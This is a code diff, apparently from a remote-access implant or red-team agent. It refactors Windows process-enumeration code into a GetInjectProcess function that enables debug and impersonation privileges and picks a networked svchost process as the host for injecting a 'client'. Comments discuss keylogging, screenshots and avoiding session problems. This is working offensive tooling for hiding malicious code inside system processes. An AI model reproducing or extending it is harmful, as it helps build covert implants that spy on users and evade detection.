@@ -2,15 +2,15 @@
 
 // Returns the PID of process to inject the client into
 // Should be modified for your specific needs
-// Currently, prefers Winlogon (need ~system-ish creds), then networked Svchost (admin creds), then Explorer (user creds)
-//DWORD GetInjectProcess(void)
-int main(void)
+// Currently, prefers svchost (system), then networked Svchost (user creds), then maybe Explorer (user creds)
+// int main(void)
+DWORD GetInjectProcess(void)
 {
     HANDLE hProcessSnap;
     HANDLE targetProcess;
     PROCESSENTRY32 pe32;
     HANDLE self = NULL;
-
+    DWORD target = 0;       // Return value
 
     // Try to get some privs to enable injecting into higher privileged processes
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &self))
@@ -20,7 +20,11 @@ int main(void)
 	}
 
     // If we are elevated, we can try for Winlogon. Otherwise, svchost -> explorer
-    BOOL elevated = (SetPriv(self, SE_DEBUG_NAME) && SetPriv(self, SE_IMPERSONATE_NAME));
+
+    // TODO: Inserting into an elevated process is usually in another Session
+    // Useless for keylogging, screenshots, interacting with the user
+    // Would have to migrate interactive features into session, requires split in code for interactive/non-interactive?
+    // BOOL elevated = (SetPriv(self, SE_DEBUG_NAME) && SetPriv(self, SE_IMPERSONATE_NAME));
 
     hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hProcessSnap == INVALID_HANDLE_VALUE)
@@ -42,41 +46,72 @@ int main(void)
     do
     {
         char *winlogon = NULL;
-        if (elevated)
-            winlogon   = strstr(pe32.szExeFile, "ogon");
-        char *svchost  = strstr(pe32.szExeFile, "vcho");
-        char *explorer = strstr(pe32.szExeFile, "xplo");
+        char *svchost  = NULL;
+        char *explorer = NULL;
+        // if (elevated)
+        //     winlogon   = strstr(pe32.szExeFile, "ogon");
+        // else
+        // {
+            svchost  = strstr(pe32.szExeFile, "vcho");
+        //  explorer = strstr(pe32.szExeFile, "xplo"); // For now, never go into explorer
+        // }
         if (!winlogon && !svchost && !explorer)
             continue;
+
         dprintf("\n\n=====================================================");
-        dprintf("\nPROCESS NAME:  %s", pe32.szExeFile);
+        dprintf("\nPROCESS NAME:  %s [%d]", pe32.szExeFile, pe32.th32ProcessID);
         dprintf("\n-------------------------------------------------------");
 
-        // Print full path of the executable
         TCHAR szProcessPath[MAX_PATH];
         HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
         if (hProcess != NULL)
         {
+            // Print full path of the executable
             if (GetModuleFileNameEx(hProcess, NULL, szProcessPath, MAX_PATH))
             {
                 dprintf("\nPath: %s", szProcessPath);
             }
             else
-            {
                 continue;
-            }
+
+            // if (!stricmp("c:\\windows\\system32\\winlogon.exe", szProcessPath))
+            // {
+            //     target = pe32.th32ProcessID;
+            //     break;
+            // }
+
+            // Inject into a svchost that already has networking.
+            // Right now, this avoids LocalService accounts and puts you into
+            // a user-owned svchost
+            if (   !stricmp("c:\\windows\\system32\\svchost.exe", szProcessPath) 
+                && GetProcessModule(pe32.th32ProcessID, "WS2_32"))
+                {
+                    // if (elevated)
+                    // {
+                    //     if (wcsstr(GetProcessUserToken(hProcess), L"S-1-5-18"))
+                    //         target = pe32.th32ProcessID;
+                    //     else
+                    //         continue; // Continue to not hit the break below.
+                    // }
+                    // else
+                        target = pe32.th32ProcessID;
+                    dprintf("Breaking.\n");
+                    break;
+                }
+                
+
 
             // List loaded modules (DLLs)
-            dprintf("\nLoaded Modules:\n");
-            ListProcessModules(pe32.th32ProcessID);
+            // dprintf("\nLoaded Modules:\n");
+            // ListProcessModules(pe32.th32ProcessID);
 
             // List threads of the process
             // printf("\nThreads:\n");
             // ListProcessThreads(pe32.th32ProcessID);
 
             // List privileges of the process
-            dprintf("\nPrivileges:\n");
-            ListProcessPrivileges(hProcess);
+            // dprintf("\nPrivileges:\n");
+            // GetProcessUserToken(hProcess);
 
             // List tokens of the process
             // printf("\nTokens:\n");
@@ -86,14 +121,51 @@ int main(void)
         }
         else
         {
-            dprintf("\nError: Unable to open process handle.\n");
+            //dprintf("\nError: Unable to open process handle.\n");
         }
 
     } while (Process32Next(hProcessSnap, &pe32));
 
     CloseHandle(hProcessSnap);
 
-    return 0;
+    printf("returning: %d\n", target);
+    return target;
+}
+
+BOOL GetProcessModule(DWORD processID, char* moduleName)
+{
+    HANDLE hModuleSnap = INVALID_HANDLE_VALUE;
+    MODULEENTRY32 me32;
+
+    hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processID);
+    if (hModuleSnap == INVALID_HANDLE_VALUE)
+    {
+        dprintf("Error: Unable to create module snapshot.\n");
+        return FALSE;
+    }
+
+    me32.dwSize = sizeof(MODULEENTRY32);
+
+    if (!Module32First(hModuleSnap, &me32))
+    {
+        dprintf("Error: Unable to retrieve information about the first module.\n");
+        CloseHandle(hModuleSnap);
+        return FALSE;
+    }
+
+    // Walk the module list of the process
+    do
+    {
+        // dprintf("\t%s (0x%p)\n", me32.szModule, me32.modBaseAddr);
+        if (strstr(me32.szModule, moduleName))
+        {
+            CloseHandle(hModuleSnap);
+            return TRUE;
+        }
+    } while (Module32Next(hModuleSnap, &me32));
+
+    CloseHandle(hModuleSnap);
+    return FALSE;
 }
 
 void ListProcessModules(DWORD processID)
@@ -257,14 +329,14 @@ void ListProcessThreads(DWORD processID)
 */
 
 // Gets the TokenUser and converts to SID
-/*
-void GetProcessUserToken(HANDLE hProcess)
+// returned string needs to be LocalFree()'d
+LPWSTR GetProcessUserToken(HANDLE hProcess)
 {
     HANDLE hToken;
     if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
     {
         dprintf("Error: Unable to open process token.\n");
-        return;
+        return NULL;
     }
 
     DWORD dwSize = 0;
@@ -275,7 +347,7 @@ void GetProcessUserToken(HANDLE hProcess)
     {
         dprintf("Error: Unable to get token information size.\n");
         CloseHandle(hToken);
-        return;
+        return NULL;
     }
 
     ptu = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), 0, dwSize);
@@ -283,7 +355,7 @@ void GetProcessUserToken(HANDLE hProcess)
     {
         dprintf("Error: Heap allocation failed for token user.\n");
         CloseHandle(hToken);
-        return;
+        return NULL;
     }
 
     if (!GetTokenInformation(hToken, TokenUser, ptu, dwSize, &dwSize))
@@ -291,7 +363,7 @@ void GetProcessUserToken(HANDLE hProcess)
         dprintf("Error: Unable to get token user.\n");
         HeapFree(GetProcessHeap(), 0, ptu);
         CloseHandle(hToken);
-        return;
+        return NULL;
     }
 
     LPWSTR pszSid = NULL;
@@ -300,13 +372,13 @@ void GetProcessUserToken(HANDLE hProcess)
         dprintf("Error: Unable to convert SID to string.\n");
         HeapFree(GetProcessHeap(), 0, ptu);
         CloseHandle(hToken);
-        return;
+        return NULL;
     }
 
-    printf("\tUser SID: %ws\n", pszSid);
+    dprintf("\tUser SID: %ws\n", pszSid);
 
-    LocalFree(pszSid);
+    // LocalFree(pszSid);
     HeapFree(GetProcessHeap(), 0, ptu);
     CloseHandle(hToken);
+    return pszSid;
 }
-*/
